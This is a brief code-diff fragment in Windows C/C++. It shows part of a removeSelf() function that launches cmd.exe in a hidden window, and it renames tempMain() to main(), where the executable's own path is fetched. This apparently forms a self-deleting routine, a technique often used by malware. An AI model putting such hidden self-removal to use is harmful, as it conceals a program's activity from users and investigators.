@@ -169,7 +169,7 @@ void removeSelf() {
     ShellExecuteA(NULL, "open", "cmd.exe", cmd, NULL, SW_HIDE);
 }
 
-int tempMain() {
+int main() {
 
     char* exePath = getCurrentExePath();
 
